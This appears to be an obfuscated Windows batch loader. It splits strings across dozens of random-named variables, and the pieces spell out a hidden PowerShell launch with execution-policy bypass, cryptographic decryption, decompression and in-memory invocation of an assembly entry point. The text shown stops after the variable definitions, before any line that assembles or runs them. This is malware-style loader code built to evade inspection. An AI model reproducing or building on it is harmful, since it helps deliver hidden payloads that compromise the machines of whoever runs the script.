@echo off
set "lptnqqXqDY=po"
set "YvKEittNci=do"
set "CVtDrkYiPI=ll"
set "jCNtzMKEdn=0\"
set "CAxxsdBbqZ=py"
set "IdivxjxiWe=rS"
set "iJBqcmONnE=1."
set "ZLYEVnklrA=xe"
set "dgliCSpoZL=he"
set "QWcZJVsvVb=we"
set "gaiyDgBBSt=ws"
set "zKpdlcIiLu=Sy"
set "yPGNIsfGTy=co"
set "jGGzkXfaID=in"
set "vkVkylrmsY=rs"
set "tHdYSaujOf=.e"
set "FmOPJZlMyo=ow"
set "sTDoONNSSe= C"
set "twuUtTtdBe=we"
set "qcadvbRkDE=\W"
set "SMUgaElsYV=nd"
set "RTKTWGRyuy=Po"
set "jCEovIenyg=em"
set "tkIGIUsNut=s\"
set "ryAQUuocCP=Wi"
set "NfFRLNKpwN=\v"
set "ODpLZdJrtJ=:\"
set "vDhoMeLQIB=he"
set "exmMFvdnqB=y "
set "myXFvVXKDH=32"
set "DfePQWZGZL= /"
set "SrsxdeKLgU=st"
set "oykokNhTaF=ll"
set "BhVTGNBHHu= %~dp0"
set "aNxEJtkVyJ=cd"
set "GGoZasNrYP=ress"
set "smsFrwKkux='dqR"
set "ShUSPiXFmJ=sion"
set "DHpJIpqzAJ=);$y"
set "XiStLyxuZh=bypa"
set "ePwlogUtRU=oint"
set "QWVymiihVY=tGds"
set "RmfFChAQTx=ionM"
set "wAnJMhQpNc=rity"
set "PDfRFJHRXK=pose"
set "CbWoPtCZdk=:('g"
set "RsqtsOwshd=qWCV"
set "EsjBiDQEsI=Mode"
set "rJHgySLJEs=$Tqe"
set "ywNZDSlfhZ=ddin"
set "xqCQJbgjNv=1..-"
set "IUwlioiYIF=.Mem"
set "QBTjYArbNd=vfx."
set "wvSsgxYUIz= = $"
set "ladmMLhXWR=)) {"
set "wjZhwHdYUm=7Yiv"
set "OKhgBWWHIw=ew-O"
set "BiSiCuohqV=gnir"
set "LSftIcbBSc=y.Cr"
set "eeaqgcKeLm=);$u"
set "TPTqSKMrzm=;$uO"
set "BIqfEnSVbK=:: '"
set "hujnMQCapa=ck($"
set "POpuOuuTlj= = $"
set "cGDANiwgDx=+hAO"
set "COxlxmqdsc=nSLJ"
set "biXNryNreq=n ''"
set "atHlqlsEub=ose("
set "XagEIETkSk='')("
set "dPeDmjwRrc=ynSL"
set "HIexFjjiHh=ypto"
set "CReyNyjVjY=yTo("
set "YbyUpFYJXF= New"
set "ZVLaMlssIt=Star"
set "bdIGRcXqqP=Comp"
set "FyfHFATpRW=New-"
set "hbmRaQKVUt=New-"
